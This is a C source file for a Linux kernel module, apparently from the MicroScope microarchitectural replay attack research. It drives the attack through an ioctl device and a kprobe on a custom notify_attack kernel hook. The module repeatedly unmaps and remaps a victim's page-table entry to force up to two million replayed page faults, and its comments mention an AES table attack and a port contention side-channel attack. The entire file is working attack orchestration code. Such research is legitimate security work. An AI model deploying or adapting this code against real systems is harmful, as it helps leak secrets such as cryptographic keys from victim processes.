/*
 * Author: Dimitrios Skarlatos
 * Contact: skarlat2@illinois.edu - http://skarlat2.web.engr.illinois.edu/
 *
 * nuke_mod.c is a kernel module that facilitates as the interface to
 * the victim application and as an orchestration between the page fault handler
 * the nuke of the page tables.
 * 
 * This version uses the following kernel features:
 *      1. Ioctl
 *      2. Kprobes
 */

#include <asm/cacheflush.h>
#include <asm/io.h>
#include <asm/mmu_context.h>
#include <asm/pgalloc.h>
#include <asm/pgtable.h>
#include <asm/tlb.h>
#include <asm/tlbflush.h>
#include <asm/uaccess.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/hrtimer.h>
#include <linux/hugetlb.h>
#include <linux/interrupt.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/ktime.h>
#include <linux/memcontrol.h>
#include <linux/mm.h>
#include <linux/mman.h>
#include <linux/mmu_notifier.h>
#include <linux/module.h>
#include <linux/pagemap.h>
#include <linux/pid.h>
#include <linux/rmap.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/swap.h>
#include <linux/swapops.h>
#include <linux/syscalls.h>
#include <linux/timer.h>

#include "nuke_mod.h"
#include "util.h"

MODULE_LICENSE("GPL v2");

// Ioctl variables
#define DEVICE_NAME "nuke_mod"
#define BUF_LEN 80		// Size of ioctl input buffer
static int Device_Open = 0;

// Kprobe struct used to add code to the page fault handler
// NOTE: notify_attack is actually a function we added to the 
// kernel and that is why microscope requires a custom kernel.
static struct kprobe kp = {
	.symbol_name = "notify_attack",
};

// Microscope variables
#define RETRIES 2000000 // Number of computations we want to monitor
#define MAX_NUKES 2		// Maximum number of addresses to nuke (2 in of the AES attack, 1 in the port contention attack)
struct attack_info the_info[MAX_NUKES];
struct attack_info *ptr_info;
extern pte_t *fault_pte;
static uint32_t nuked_cnt = 0, monitored_cnt = 0;
static uint64_t fault_cnt = 0, fault_fault_cnt = 0;

// Variables used when we have monitors in the kernel (e.g. AES attack)
static uint32_t pf_switch = 0;
static uint32_t switches = 0;

/*
 * device_open is invoked when the victim connects to the char device.
 */
static int device_open(struct inode *inode, struct file *file)
{
	if (Device_Open)
		return -EBUSY;

	Device_Open++;
	try_module_get(THIS_MODULE);
	return 0;
}

/*
 * device_release is invoked when the victim disconnects from the char device.
 */
static int device_release(struct inode *inode, struct file *file)
{
	Device_Open--;

	module_put(THIS_MODULE);
	return 0;
}

/*
 * device_write identifies the requested write from IOCTL and routes it to the proper function.
 */
static ssize_t device_write(struct file *file, const char __user *buffer, size_t length, loff_t *offset, enum call_type type)
{
	int i;
	uint64_t address;
	char write_str[BUF_LEN];
	char *write_str_ptr;

	// Store user space buffer variable (representing the address) into write_str
	for (i = 0; i < length && i < BUF_LEN; i++)
		get_user(write_str[i], buffer + i);
	write_str_ptr = write_str;

	// Convert the string of the write_str into an uint64_t (address).
	// Note that setting the base to zero indicates that the base should be determined
	// from the leading digits of write_str. The default is decimal, a leading '0'
	// indicates octal, and a leading '0x' or '0X' indicates hexadecimal.
    // (In this case I think we are sending the address as an integer base 10.)
	kstrtou64(write_str_ptr, 0, &address);

	// Identify the requested ioctl call
	switch (type) {
	case NUKE_ADDR:
		if (nuked_cnt >= MAX_NUKES) {
			pr_warning("Nuke_mod: Cannot nuke more than %d addresses at the same time.", MAX_NUKES);
		} else {
            pr_info("Setting up nuke id %u -> addr %p\n", nuked_cnt, (void *)address);
            setup_nuke_structs(&ptr_info[nuked_cnt], address);
            nuked_cnt++;
        }
        break;
	case MONITOR_ADDR:
		pr_info("Setting up monitor id %u -> addr %p\n", monitored_cnt, (void *)address);
		// NOTE: We store all the monitor addresses in ptr_info[0], regardless of how many nuked addresses we have
		setup_monitor_structs(&ptr_info[0], address, monitored_cnt);
		monitored_cnt++;
		break;
	case PF:
		pr_info("Preparing the page fault for the nuked address\n");
		pf_prep(&ptr_info[0], ptr_info[0].nuke_addr, monitored_cnt);
		fault_cnt = 0;
		fault_fault_cnt = 0;
		break;
    case LONG_LATENCY:
		// pr_info("Making the load long latency for the nuked address\n");
		cause_long_latency(&ptr_info[0], ptr_info[0].nuke_addr);
		break;
	default:
		break;
	}

	// Return number of characters read
	return i;
}

/*
 * device_ioctl services IOCTL requests to this character device
 * MSG - Just store the message into the char device (nothing microscope-related)
 * NUKE_ADDR - Pass the address to nuke (e.g., the replay handle)
 * MONITOR_ADDR - Pass the base monitor address (e.g. the AES Td tables), we will search for the actual one
 * PREP_PF - Set up the replay mechanism through page faults.
 */
long device_ioctl(struct file *file, unsigned int ioctl_num, unsigned long ioctl_param)
{
	int i = 0;
	char *temp;
	char ch;

	// pr_info("IOCTL param %u\n", ioctl_num);
	temp = (char *)ioctl_param;
	get_user(ch, temp);
	for (i = 0; ch && i < BUF_LEN; i++, temp++) {
		get_user(ch, temp);
	}

	switch (ioctl_num) {
	case IOCTL_SET_MSG:
		device_write(file, (char *)ioctl_param, i, 0, MSG);
		break;
	case IOCTL_SET_NUKE_ADDR:
		device_write(file, (char *)ioctl_param, i, 0, NUKE_ADDR);
		break;
	case IOCTL_SET_MONITOR_ADDR:
		device_write(file, (char *)ioctl_param, i, 0, MONITOR_ADDR);
		break;
	case IOCTL_PREP_PF:
		device_write(file, (char *)ioctl_param, i, 0, PF);
		break;
	case IOCTL_LONG_LATENCY:
		device_write(file, (char *)ioctl_param, i, 0, LONG_LATENCY);
		break;
	default:
		break;
	}

	return 0;
}

/*
 * Ioctl operations struct - defines the supported operations
 * Ioctl code is mainly from: https://linux.die.net/lkmpg/x892.html
 */
struct file_operations Fops = {
	.unlocked_ioctl = device_ioctl,
	.open = device_open,
	.release = device_release,
};

/*
 * handler_fault is invoked in the case of a nested page fault while we were
 * executing the kprobes trampoline code (see post_handler).
 * Usually this means that we tried to access an address we shouldn't. In this
 * scenario we stop the attack gracefully. In normal operation fault-on-fault
 * should not be triggered.
 */
int handler_fault(struct kprobe *p, struct pt_regs *regs, int trapnr)
{
	fault_fault_cnt++;
	pr_info("Nuke_mod: Fult-on-Fault counter %llu, fault counter %llu\n", fault_cnt, fault_fault_cnt);

    // Cancel this nuke
	if (fault_pte) {
		*fault_pte = pte_set_flags(*fault_pte, _PAGE_PRESENT);
		pr_info("Nuke_mod: Fault-on-Fault resetting present bit %llu\n", fault_cnt);
	}

    // Mark attack as off
	set_attack_value(NULL, 0);
	pr_info("Nuke_mod: Fault-on-Fault. Attack failed %llu. Remove nuke_mod and restart.\n", fault_cnt);

	// We let the kprobe handler to handle the page fault
	return 0;
}

/*
 * pre_handler is invoked before the notify_attack (memory.c)
 * we don't have to perform any steps here.
 */
int pre_handler(struct kprobe *p, struct pt_regs *regs) { return 0; }

/*
 * post_handler is invoked after a notify_attack (memory.c) has finished.
 * At this point we know that a page fault on the replay handle was caused
 * and we proceed with the next steps of the attack.
 * NOTE: this is the simpler code used in the port contention attack, where 
 * the "monitor" is a separate user space process.
 * In the AES attack case, where the monitor is in-kernel, we need a different
 * post_hadler (see poc_v0.3).
 */
void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
{
	uint64_t old_time = 0, wait_time = 0;
	uint64_t v0 = 0, v1 = 0, access_time = 0;
	int i;

    // fault_pte is set in the kernel (that's why it's extern here)
	if (fault_pte) {
		v0 = pte_pfn(*fault_pte);
		v1 = pte_pfn(*(ptr_info[0].nuke_ptep)); // in the port contention attack where we only have 1 nuked address

		if (v0 == v1) { // double checking that this is the correct page fault

			if (fault_cnt == RETRIES) { // we reached the max number of retries we are done with the attack
				pr_info("Nuke_mod: Reached maximum retries %u\n", RETRIES);
				if (fault_pte) {
					*fault_pte = pte_set_flags(*fault_pte, _PAGE_PRESENT);
					pr_info("Nuke_mod: Resetting present bit %u\n", switches);
				}

				set_attack_value(NULL, 0);
				pr_info("Nuke_mod: Attack is done %u\n. Remove module.", switches);

			} else if (fault_cnt < RETRIES) { // we are still under the limit of retries: the attack is still underway
                if (fault_pte) {

                    // Wait some padding time for no reason
                    // TODO: why is this necessary?
                    old_time = 0;
                    wait_time = 0;
                    while (wait_time < 10000) {
                        old_time = rdtsc();
                        wait_time += rdtsc() - old_time;
                    }

                    // Cause minor page fault again
                    pf_redo(&ptr_info[0], ptr_info[0].nuke_addr);

                    // Wait some padding time
                    // TODO: why is this necessary?
                    old_time = 0;
                    wait_time = 0;
                    while (wait_time < 10000) {
                        old_time = rdtsc();
                        wait_time += rdtsc() - old_time;
                    }
                }
            }

			fault_cnt++;
		}
	}
}

/*
 * init_mudule registers the device and the trampoline kprobes code
 */
int init_module()
{
	int ret_val;

	// Register ioctl for nuke_mod
	// Read about ioctl here: https://stackoverflow.com/questions/15807846/ioctl-linux-device-driver/15809221
	ret_val = register_chrdev(MAJOR_NUM, DEVICE_NAME, &Fops);
	if (ret_val < 0) {
		pr_alert("Registering the device failed with %d\n", ret_val);
		return ret_val;
	}

	// Setup kprobes for notify_attack() in memory.c
	kp.pre_handler = pre_handler;
	kp.post_handler = post_handler;
	kp.fault_handler = handler_fault;   // called if executing addr causes a fault (eg. page fault)

	// Register kprobe
	ret_val = register_kprobe(&kp);
	if (ret_val < 0) {
		pr_alert("Registering probe failed with %d\n", ret_val);
		return ret_val;
	}

    // Setup microscope variables
	ptr_info = &the_info[0];
	ptr_info->error = 0;

	// Disable debug prints in memory.c
	set_print_msg_attack(0);
	pr_info("Nuke module loaded. If a channel does not exist run: mknod %s c %d 0\n", DEVICE_FILE_NAME, MAJOR_NUM);

	return 0;
}

/*
 * cleanup_module unregisters the device, the probes, and disables the attack
 */
void cleanup_module()
{
	unregister_chrdev(MAJOR_NUM, DEVICE_NAME);
	unregister_kprobe(&kp);
	set_print_msg_attack(0);
	set_attack_value(NULL, 0);
}
